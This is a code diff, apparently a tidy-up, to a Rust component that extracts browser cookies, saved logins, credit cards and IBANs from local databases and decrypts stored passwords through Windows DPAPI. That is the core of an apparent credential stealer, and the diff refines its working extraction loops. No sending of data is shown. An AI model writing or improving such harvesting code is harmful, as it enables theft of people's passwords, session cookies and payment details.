@@ -51,6 +51,12 @@ pub struct ExtractionResult {
     pub iban_data: Vec<IbanData>,
 }
 
+impl Default for ExtractionResult {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
 impl ExtractionResult {
     pub fn new() -> Self {
         Self {
@@ -141,10 +147,8 @@ impl DataExtractor {
             })
             .context("Failed to query cookies")?;
 
-        for cookie in cookie_iter {
-            if let Ok(c) = cookie {
-                cookies.push(c);
-            }
+        for c in cookie_iter.flatten() {
+            cookies.push(c);
         }
 
         let _ = std::fs::remove_file(&temp_path);
@@ -187,10 +191,8 @@ impl DataExtractor {
             })
             .context("Failed to query logins")?;
 
-        for login in login_iter {
-            if let Ok(l) = login {
-                login_data.push(l);
-            }
+        for l in login_iter.flatten() {
+            login_data.push(l);
         }
 
         let _ = std::fs::remove_file(&temp_path);
@@ -233,10 +235,8 @@ impl DataExtractor {
             })
             .context("Failed to query credit cards")?;
 
-        for payment in payment_iter {
-            if let Ok(p) = payment {
-                payment_data.push(p);
-            }
+        for p in payment_iter.flatten() {
+            payment_data.push(p);
         }
 
         let _ = std::fs::remove_file(&temp_path);
@@ -281,10 +281,8 @@ impl DataExtractor {
                 })
                 .context("Failed to query IBANs")?;
 
-            for iban in iban_iter {
-                if let Ok(i) = iban {
-                    iban_data.push(i);
-                }
+            for i in iban_iter.flatten() {
+                iban_data.push(i);
             }
         }
 
@@ -308,7 +306,7 @@ impl DataExtractor {
     fn decrypt_dpapi_password(&self, encrypted: &[u8]) -> Result<String> {
         use windows::Win32::Security::Cryptography::*;
 
-        let mut data_blob = CRYPT_INTEGER_BLOB {
+        let data_blob = CRYPT_INTEGER_BLOB {
             cbData: encrypted.len() as u32,
             pbData: encrypted.as_ptr() as *mut u8,
         };
@@ -319,7 +317,7 @@ impl DataExtractor {
         };
 
         unsafe {
-            CryptUnprotectData(&mut data_blob, None, None, None, None, 0, &mut output_blob)?;
+            CryptUnprotectData(&data_blob, None, None, None, None, 0, &mut output_blob)?;
 
             let decrypted =
                 std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
